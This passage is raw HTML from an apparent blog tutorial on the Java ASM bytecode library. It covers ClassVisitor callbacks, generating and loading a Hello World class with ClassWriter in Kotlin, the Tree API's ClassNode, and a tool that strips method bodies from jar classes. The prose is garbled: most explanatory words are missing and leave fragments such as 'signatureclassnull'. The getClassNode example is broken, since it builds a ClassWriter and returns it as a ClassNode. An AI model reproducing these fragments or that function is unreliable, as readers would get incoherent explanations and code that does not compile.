data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ClassVisitor</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">visit</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> version<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> access<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> signature<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> superName<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> interfaces<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">FieldVisitor</span> <span class=\"token function\">visitField</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> access<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> desc<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> signature<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">MethodVisitor</span> <span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> access<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> desc<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> signature<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> exceptions<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>ClassVisitor</p>\n<blockquote>\n<h6 id=\"1void-visit-int-version-int-access-String-name-String-signature-String-superName-String-interfaces\"><a href=\"#1void-visit-int-version-int-access-String-name-String-signature-String-superName-String-interfaces\" class=\"headerlink\" title=\"1void visit(int version, int access, String name, String signature, String superName, String[] interfaces)\"></a>1void visit(int version, int access, String name, String signature, String superName, String[] interfaces)</h6><p>class</p>\n<p>versionclass</p>\n<p>access </p>\n<p>name</p>\n<p>signatureclassnull</p>\n<p>superName</p>\n<p>interfaces</p>\n<h6 id=\"2void-visitAnnotation-String-descriptor-boolean-visible\"><a href=\"#2void-visitAnnotation-String-descriptor-boolean-visible\" class=\"headerlink\" title=\"2void visitAnnotation(String descriptor, boolean visible)\"></a>2void visitAnnotation(String descriptor, boolean visible)</h6><p>class</p>\n<p>descriptor</p>\n<p>visible</p>\n<h6 id=\"3FieldVisitor-visitField-int-access-String-name-String-descriptor-String-signature-Object-value\"><a href=\"#3FieldVisitor-visitField-int-access-String-name-String-descriptor-String-signature-Object-value\" class=\"headerlink\" title=\"3FieldVisitor visitField(int access, String name,String descriptor, String signature,Object value)\"></a>3FieldVisitor visitField(int access, String name,String descriptor, String signature,Object value)</h6><p>classFieldVisitor</p>\n<p>name</p>\n<p>descriptor</p>\n<p>value</p>\n<p><code>Integer</code><code>Float</code><code>Long</code><code>Double</code><code>String</code><code>int</code><code>float</code><code>long</code> <code>String</code><em></em>null</p>\n<h6 id=\"4MethodVisitor-visitMethod-int-access-String-name-String-descriptor-String-signature-String-exceptions\"><a href=\"#4MethodVisitor-visitMethod-int-access-String-name-String-descriptor-String-signature-String-exceptions\" class=\"headerlink\" title=\"4MethodVisitor visitMethod(int access,String name,String descriptor,String signature, String[] exceptions)\"></a>4MethodVisitor visitMethod(int access,String name,String descriptor,String signature, String[] exceptions)</h6><p>classMethodVisitor</p>\n<p>name</p>\n<p>descriptor</p>\n<p>signature</p>\n<p>exceptions</p>\n<h6 id=\"5visitInnerClass-String-name-String-outerName-String-innerName-int-access\"><a href=\"#5visitInnerClass-String-name-String-outerName-String-innerName-int-access\" class=\"headerlink\" title=\"5visitInnerClass(String name, String outerName, String innerName, int access)\"></a>5visitInnerClass(String name, String outerName, String innerName, int access)</h6><p>class<strong></strong><strong></strong></p>\n<p>name<code>com/hebaibai/example/demo/Aoo$1XX</code></p>\n<p>outerName</p>\n<p>innerName</p>\n<h6 id=\"6visitOuterClass-String-owner-String-name-String-descriptor\"><a href=\"#6visitOuterClass-String-owner-String-name-String-descriptor\" class=\"headerlink\" title=\"6visitOuterClass(String owner, String name, String descriptor)\"></a>6visitOuterClass(String owner, String name, String descriptor)</h6><p></p>\n<p>classvisitInnerClass<code>com/hebaibai/example/demo/Aoo$1</code><code>com/hebaibai/example/demo/Aoo$1XX</code></p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">ClassReader classReader <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ClassReader</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com/hebaibai/example/demo/Aoo$1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DemoClassVisitor</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span><span class=\"token constant\">ASM7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> ClassReader<span class=\"token punctuation\">.</span><span class=\"token constant\">SKIP_CODE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p></p>\n<p></p>\n<p>ownerclass</p>\n<p>namenull</p>\n<p>descriptor</p>\n</blockquote>\n<p>ClassVisitorClassVisitorMethodVistitor/FieldVisitor)</p>\n<p>ClassWritervisitHelloWorld</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> classWriter <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">visit</span><span class=\"token punctuation\">(</span>\n        V1_8<span class=\"token punctuation\">,</span>\n        ACC_PUBLIC <span class=\"token operator\">+</span> ACC_SUPER<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"org/example/asmlearn/ASMLearn_Test\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"java/lang/Object\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token keyword\">null</span>\n    <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> mv <span class=\"token operator\">=</span> classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>\n        ACC_PUBLIC <span class=\"token operator\">+</span> ACC_STATIC<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"main\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"([Ljava/lang/String;)V\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n        <span class=\"token keyword\">null</span>\n    <span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitFieldInsn</span><span class=\"token punctuation\">(</span>GETSTATIC<span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/lang/System\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"out\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Ljava/io/PrintStream;\"</span><span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitLdcInsn</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello, World!\"</span><span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>INVOKEVIRTUAL<span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/io/PrintStream\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"println\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"(Ljava/lang/String;)V\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitInsn</span><span class=\"token punctuation\">(</span>RETURN<span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitMaxs</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> byteArray <span class=\"token operator\">=</span> classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> classLoader <span class=\"token operator\">=</span> <span class=\"token function\">MyClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> clazz <span class=\"token operator\">=</span> classLoader<span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"org.example.asmlearn.ASMLearn_Test\"</span><span class=\"token punctuation\">,</span> byteArray<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> m <span class=\"token operator\">=</span> clazz<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">,</span> Array<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span><span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">)</span>\n    m<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token function\">arrayOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> MyClassLoader <span class=\"token operator\">:</span> <span class=\"token function\">ClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span> b<span class=\"token operator\">:</span> ByteArray<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Class<span class=\"token operator\">&lt;</span><span class=\"token operator\">*</span><span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>asm<code>org/example/asmlearn/ASMLearn_Test</code>mainclassLoadermain</p>\n<blockquote>\n<p> asmasmasmkaptkspasm</p>\n</blockquote>\n<h5 id=\"Tree-API\"><a href=\"#Tree-API\" class=\"headerlink\" title=\"Tree API\"></a>Tree API</h5><p>Tree APICore APITree APIVisitorClassNodeClassNode/</p>\n<p>ClassNode</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">fun</span> <span class=\"token function\">getClassNode</span><span class=\"token punctuation\">(</span>clazzFile<span class=\"token operator\">:</span> File<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> ClassNode <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> classReader <span class=\"token operator\">=</span> <span class=\"token function\">ClassReader</span><span class=\"token punctuation\">(</span>clazzFile<span class=\"token punctuation\">.</span><span class=\"token function\">inputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> classNode <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">)</span>\n    classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>classNode<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> classNode\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>ClassNodeClassVisitorClassVisitor<em><strong>ClassNode</strong></em></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">val</span> classNode <span class=\"token operator\">=</span> <span class=\"token function\">getClassNode</span><span class=\"token punctuation\">(</span>clazzFile<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">val</span> methods<span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>MethodNode<span class=\"token operator\">&gt;</span> <span class=\"token operator\">=</span> classNode<span class=\"token punctuation\">.</span>methods\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">val</span> fields<span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>FieldNode<span class=\"token operator\">&gt;</span> <span class=\"token operator\">=</span> classNode<span class=\"token punctuation\">.</span>fields<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>asm</p>\n<p><a href=\"https://www.bilibili.com/read/cv13433468\">Java ASMMethodVisitorOpcode -  (bilibili.com)</a></p>\n<p></p>\n<h5 id=\"ApiJarGenerator\"><a href=\"#ApiJarGenerator\" class=\"headerlink\" title=\"ApiJarGenerator\"></a>ApiJarGenerator</h5><blockquote>\n<p>Core APICore API</p>\n</blockquote>\n<blockquote>\n<p>JavaJarJar</p>\n<p>/JarJar</p>\n<p>asmJVMJar</p>\n</blockquote>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">/**\n * org.example.asmlearn.ApiJarGenerator\n * asm-learn\n *\n * @author \n * @since 2022/7/11 14:22\n */</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">generate</span><span class=\"token punctuation\">(</span>sourceJar<span class=\"token operator\">:</span> File<span class=\"token punctuation\">,</span> output<span class=\"token operator\">:</span> File<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>output<span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        output<span class=\"token punctuation\">.</span><span class=\"token function\">createNewFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">JarOutputStream</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">.</span><span class=\"token function\">outputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">out</span> <span class=\"token operator\">-&gt;</span>\n        <span class=\"token function\">JarFile</span><span class=\"token punctuation\">(</span>sourceJar<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">{</span> jarFile <span class=\"token operator\">-&gt;</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>jarEntry <span class=\"token keyword\">in</span> jarFile<span class=\"token punctuation\">.</span><span class=\"token function\">entries</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                jarFile<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span>jarEntry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">{</span> input <span class=\"token operator\">-&gt;</span>\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>jarEntry<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">.</span><span class=\"token function\">endsWith</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".class\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token comment\">// classClassVisitor visit</span>\n                        <span class=\"token keyword\">val</span> classReader <span class=\"token operator\">=</span> <span class=\"token function\">ClassReader</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">val</span> classWriter <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">val</span> visitor <span class=\"token operator\">=</span> <span class=\"token function\">EmptyClassVisitor</span><span class=\"token punctuation\">(</span>classWriter<span class=\"token punctuation\">)</span>\n                        classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>visitor<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">out</span><span class=\"token punctuation\">.</span><span class=\"token function\">putNextEntry</span><span class=\"token punctuation\">(</span><span class=\"token function\">JarEntry</span><span class=\"token punctuation\">(</span>jarEntry<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token comment\">// class</span>\n                        <span class=\"token keyword\">out</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token keyword\">out</span><span class=\"token punctuation\">.</span><span class=\"token function\">putNextEntry</span><span class=\"token punctuation\">(</span><span class=\"token function\">JarEntry</span><span class=\"token punctuation\">(</span>jarEntry<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                        input<span class=\"token punctuation\">.</span><span class=\"token function\">copyTo</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">out</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">EmptyClassVisitor</span><span class=\"token punctuation\">(</span>visitor<span class=\"token operator\">:</span> ClassVisitor<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">ClassVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> visitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>\n        access<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        signature<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        exceptions<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> String<span class=\"token operator\">&gt;</span><span class=\"token operator\">?</span>\n    <span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> MethodVisitor <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">EmptyMethodVisitor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>access<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">,</span> exceptions<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">EmptyMethodVisitor</span><span class=\"token punctuation\">(</span>methodVisitor<span class=\"token operator\">:</span> MethodVisitor<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">MethodVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> methodVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitIincInsn</span><span class=\"token punctuation\">(</span>`<span class=\"token keyword\">var</span>`<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> increment<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitIntInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> operand<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitVarInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> `<span class=\"token keyword\">var</span>`<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTypeInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> type<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitJumpInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> label<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLabel</span><span class=\"token punctuation\">(</span>label<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLdcInsn</span><span class=\"token punctuation\">(</span>value<span class=\"token operator\">:</span> Any<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTableSwitchInsn</span><span class=\"token punctuation\">(</span>min<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> max<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> dflt<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">vararg</span> labels<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLookupSwitchInsn</span><span class=\"token punctuation\">(</span>dflt<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> keys<span class=\"token operator\">:</span> IntArray<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> labels<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> Label<span class=\"token operator\">&gt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMultiANewArrayInsn</span><span class=\"token punctuation\">(</span>descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> numDimensions<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTryCatchBlock</span><span class=\"token punctuation\">(</span>start<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> handler<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLocalVariable</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> signature<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> start<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> index<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLineNumber</span><span class=\"token punctuation\">(</span>line<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> start<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitFrame</span><span class=\"token punctuation\">(</span>type<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> numLocal<span class=\"token operator\">:</span> Int<span class=\"token 